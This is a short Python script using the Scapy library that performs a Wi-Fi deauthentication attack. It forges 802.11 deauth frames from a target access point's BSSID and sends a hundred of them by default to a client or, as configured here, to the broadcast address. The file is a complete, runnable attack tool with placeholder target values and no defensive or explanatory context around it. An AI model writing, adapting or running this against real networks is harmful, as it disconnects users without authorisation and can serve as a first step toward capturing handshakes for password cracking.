from scapy.all import *

def deauth_attack(target_bssid, client_mac, interface, count=100):
    """
    Performs a deauthentication attack against a client on a specific BSSID.
    """
    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=count, inter=0.1)
    print(f"Sent {count} deauthentication packets to {client_mac} on {target_bssid}")

if __name__ == '__main__':
    # Replace with your target's information
    target_bssid = "00:11:22:33:44:55"
    client_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast
    interface = "wlan0"
    deauth_attack(target_bssid, client_mac, interface)
